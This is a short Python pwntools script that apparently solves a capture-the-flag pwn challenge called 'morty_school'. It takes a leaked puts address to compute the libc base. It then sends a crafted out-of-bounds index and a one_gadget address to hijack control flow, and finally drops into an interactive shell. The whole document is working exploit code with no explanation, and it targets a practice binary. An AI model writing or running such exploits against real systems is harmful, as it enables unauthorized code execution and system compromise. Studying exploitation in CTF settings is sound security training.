#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./morty_school')
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# elf = ELF('./libc.so.6')

pause()

magic = 0x10a45c
# magic = 0x10a38c

p.recvuntil('Useful information: ')
elf.address = int(p.recvline(),16) - elf.sym.puts

success(hex(elf.address))

p.sendlineafter('Which Morty you want to teach?', str((0x4005c0 - 0x6020a0) / 0x18))

p.sendlineafter('Talk him the correct message:', p64(elf.address + magic))

p.sendlineafter('Confirm again:', "\x00" * 0x100)


p.interactive()
p.close()
